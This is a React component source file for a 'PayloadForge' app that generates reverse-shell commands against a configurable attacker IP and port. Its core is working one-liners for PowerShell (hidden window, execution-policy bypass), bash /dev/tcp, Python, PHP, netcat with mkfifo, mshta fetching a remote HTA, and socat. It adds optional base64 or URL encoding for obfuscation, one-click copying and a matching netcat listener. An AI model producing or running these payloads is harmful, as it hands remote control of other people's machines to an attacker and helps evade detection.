import React, { useState } from 'react';
import { Terminal, Copy, Check, Shield, Flame, Sliders, RefreshCw } from 'lucide-react';
import { soundEngine } from '../../../services/soundEffects';

interface PayloadForgeAppProps {
  windowId: string;
  isActive: boolean;
  onClose: () => void;
}

export const PayloadForgeApp: React.FC<PayloadForgeAppProps> = () => {
  const [lhost, setLhost] = useState('192.168.100.5');
  const [lport, setLport] = useState('4444');
  const [payloadType, setPayloadType] = useState<'powershell' | 'bash' | 'python' | 'php' | 'nc' | 'mshta' | 'socat'>('powershell');
  const [encoding, setEncoding] = useState<'none' | 'base64' | 'url'>('none');
  const [copied, setCopied] = useState(false);

  // Generate payload
  const getRawPayload = () => {
    switch (payloadType) {
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      case 'bash':
        return `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
      case 'python':
        return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
      case 'php':
        return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
      case 'nc':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
      case 'mshta':
        return `mshta.exe http://${lhost}:${lport}/payload.hta`;
      case 'socat':
        return `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`;
      default:
        return '';
    }
  };

  const getProcessedPayload = () => {
    const raw = getRawPayload();
    if (encoding === 'base64') {
      if (typeof window !== 'undefined') {
        const b64 = btoa(raw);
        if (payloadType === 'powershell') {
          return `powershell -EncodedCommand ${b64}`;
        }
        return `echo "${b64}" | base64 -d | sh`;
      }
    } else if (encoding === 'url') {
      return encodeURIComponent(raw);
    }
    return raw;
  };

  const currentPayload = getProcessedPayload();

  const handleCopy = () => {
    soundEngine.playClick();
    navigator.clipboard.writeText(currentPayload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="h-full flex flex-col p-4 bg-[#09070e] text-zinc-200 font-sans">
      {/* Title & Host Configuration */}
      <div className="grid grid-cols-2 gap-3 pb-3 mb-3 border-b border-white/10">
        <div>
          <label className="text-[11px] font-mono text-zinc-400 block mb-1">LHOST (Attacker IP)</label>
          <input
            type="text"
            value={lhost}
            onChange={(e) => setLhost(e.target.value)}
            className="w-full px-3 py-1.5 rounded-xl bg-black/40 border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-red-500/50"
          />
        </div>
        <div>
          <label className="text-[11px] font-mono text-zinc-400 block mb-1">LPORT (Listener Port)</label>
          <input
            type="text"
            value={lport}
            onChange={(e) => setLport(e.target.value)}
            className="w-full px-3 py-1.5 rounded-xl bg-black/40 border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-red-500/50"
          />
        </div>
      </div>

      {/* Payload Selector Chips */}
      <div className="flex flex-wrap gap-1.5 mb-3">
        {(['powershell', 'bash', 'python', 'php', 'nc', 'mshta', 'socat'] as const).map((type) => (
          <button
            key={type}
            onClick={() => {
              soundEngine.playClick();
              setPayloadType(type);
            }}
            className={`px-3 py-1 rounded-lg text-xs font-mono uppercase font-bold transition-all ${
              payloadType === type
                ? 'bg-red-500/20 text-red-300 border border-red-500/50 shadow-[0_0_12px_rgba(239,68,68,0.25)]'
                : 'bg-white/5 text-zinc-400 hover:text-white border border-white/5'
            }`}
          >
            {type}
          </button>
        ))}
      </div>

      {/* Encoding Option */}
      <div className="flex items-center gap-2 mb-3 text-xs font-mono text-zinc-400">
        <span>Encoding:</span>
        {(['none', 'base64', 'url'] as const).map((enc) => (
          <button
            key={enc}
            onClick={() => {
              soundEngine.playClick();
              setEncoding(enc);
            }}
            className={`px-2 py-0.5 rounded text-[11px] uppercase transition-all ${
              encoding === enc
                ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 font-bold'
                : 'bg-white/5 text-zinc-500 hover:text-zinc-300'
            }`}
          >
            {enc}
          </button>
        ))}
      </div>

      {/* Output Code Container */}
      <div className="flex-1 flex flex-col rounded-xl border border-white/10 bg-black/60 overflow-hidden relative">
        <div className="flex items-center justify-between px-3 py-2 bg-white/5 border-b border-white/10 text-xs font-mono text-zinc-400">
          <div className="flex items-center gap-2">
            <Flame className="w-3.5 h-3.5 text-red-400" />
            <span className="text-white font-bold">{payloadType.toUpperCase()} REVERSE SHELL</span>
          </div>
          <button
            onClick={handleCopy}
            className={`flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold transition-all ${
              copied
                ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                : 'bg-red-500/20 hover:bg-red-500/30 text-red-300 border border-red-500/40 shadow-[0_0_10px_rgba(239,68,68,0.2)]'
            }`}
          >
            {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
            {copied ? 'COPIED TO CLIPBOARD' : 'COPY ONE-CLICK'}
          </button>
        </div>

        <div className="flex-1 p-3 overflow-auto font-mono text-xs text-red-200/90 leading-relaxed whitespace-pre-wrap break-all select-all">
          {currentPayload}
        </div>
      </div>

      {/* Quick Netcat Listener Helper */}
      <div className="mt-3 p-2.5 rounded-xl bg-white/5 border border-white/5 flex items-center justify-between font-mono text-xs">
        <div className="text-zinc-400">
          <span className="text-zinc-500">Listener:</span> <span className="text-white font-bold">nc -lvnp {lport}</span>
        </div>
        <button
          onClick={() => {
            soundEngine.playClick();
            navigator.clipboard.writeText(`nc -lvnp ${lport}`);
          }}
          className="text-[10px] text-cyan-400 hover:text-cyan-300 underline"
        >
          Copy Listener
        </button>
      </div>
    </div>
  );
};
